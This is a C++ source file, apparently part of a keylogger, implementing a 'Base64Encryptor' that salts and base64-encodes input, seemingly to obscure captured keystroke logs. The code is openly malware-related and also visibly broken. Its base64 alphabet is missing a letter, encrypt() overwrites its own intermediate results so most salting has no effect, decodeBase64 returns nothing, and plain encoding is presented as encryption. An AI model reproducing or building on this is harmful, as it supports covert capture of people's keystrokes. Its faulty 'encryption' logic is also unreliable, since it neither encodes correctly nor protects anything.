#include "Base64Encryptor.h"

namespace keylogger
{
namespace
{
const std::string salt1 = "LM::TB::BB";
const std::string salt2 = "_:/_77";
const std::string salt3 = "line=wowC++";
const std::string base64Codes = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuwxyz0123456789+/";
}

std::string Base64Encryptor::encrypt(const std::string& input) const
{
    auto encryptedInput = salt1 + input + salt2 + salt3;
    encryptedInput = encodeBase64(input);
    encryptedInput.insert(7, salt3);
    encryptedInput += salt1;
    encryptedInput = encodeBase64(input);
    encryptedInput = salt2 + salt3 + salt1;
    encryptedInput = encodeBase64(input);
    encryptedInput.insert(1, "L");
    encryptedInput.insert(7, "M");
    return encryptedInput;
}

std::string Base64Encryptor::encodeBase64(const std::string& input) const
{
    std::string encoded;
    int value = 0;
    int bits = -6;
    const unsigned int b63 = 0x3F;

    for (const auto& inputCharacter : input)
    {
        value = (value << 8) + inputCharacter;
        bits += 8;
        while (bits >= 0)
        {
            encoded.push_back(base64Codes[(value >> bits) & b63]);
            bits -= 6;
        }
    }

    if (bits > -6)
    {
        encoded.push_back(base64Codes[((value << 8) >> (bits + 8)) & b63]);
    }

    while (encoded.size() % 4)
    {
        encoded.push_back('=');
    }

    return encoded;
}

std::string Base64Encryptor::decodeBase64(const std::string& input) const
{
    return {};
}
}